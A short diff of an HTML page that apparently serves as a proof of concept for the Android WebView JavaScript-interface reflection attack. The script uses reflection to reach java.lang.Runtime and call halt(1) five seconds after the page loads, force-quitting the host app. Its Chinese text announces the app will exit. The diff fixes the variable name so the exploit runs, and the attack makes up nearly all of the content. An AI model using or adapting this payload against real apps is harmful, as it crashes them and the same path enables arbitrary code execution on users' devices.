@@ -1,4 +1,3 @@
-
     <script>
         function exec2(){
             var obj;
@@ -9,10 +8,10 @@
                     break;
                 }
             }
-            test.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).halt(1);
+            obj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).halt(1);
         }
         window.onload=function(){
             setTimeout(exec2,5000);
         }
     </script>
-            hello world！ 5秒后将退出手Q
+            hello world！ 5秒后将退出应用
